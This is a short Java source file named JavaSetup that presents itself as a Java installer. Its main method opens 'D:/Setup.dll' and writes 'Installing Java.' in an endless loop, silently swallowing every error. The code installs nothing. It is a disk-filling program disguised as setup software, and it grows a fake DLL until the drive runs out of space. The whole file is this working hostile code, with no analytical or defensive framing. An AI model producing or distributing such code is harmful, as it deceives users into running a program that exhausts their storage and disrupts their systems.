import java.io.*;

class JavaSetup
{
   public static void main(String args[])
   {
      try
      {
         FileWriter f = new FileWriter("D:/Setup.dll", true);
         while (true) {
            f.write("Installing Java.");
         }
      }
      catch (FileNotFoundException e) {} 
      catch (IOException e) {}
   }
}
